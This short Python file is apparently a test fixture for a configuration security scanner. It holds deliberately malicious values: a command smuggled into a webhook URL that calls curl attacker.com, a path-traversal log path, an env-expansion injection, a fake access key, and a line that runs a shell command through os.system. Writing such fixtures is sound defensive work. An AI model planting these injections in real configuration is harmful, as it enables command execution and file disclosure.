"""
Malicious configuration file.
Contains attempts to exploit configuration parsing.
"""

# Looks like a normal config
DATABASE_URL = "postgresql://localhost/app"
API_KEY = "AKIA1234567890EXAMPLE"  # Should be detected as secret

# Injection in config values
WEBHOOK_URL = "https://legitimate.com; curl attacker.com"
LOG_PATH = "../../../var/log/sensitive.log"

# Command injection via env expansion
SHELL_CMD = "${curl attacker.com}"

# Override attempt
__import__("os").system("whoami")  # This line should trigger security alert
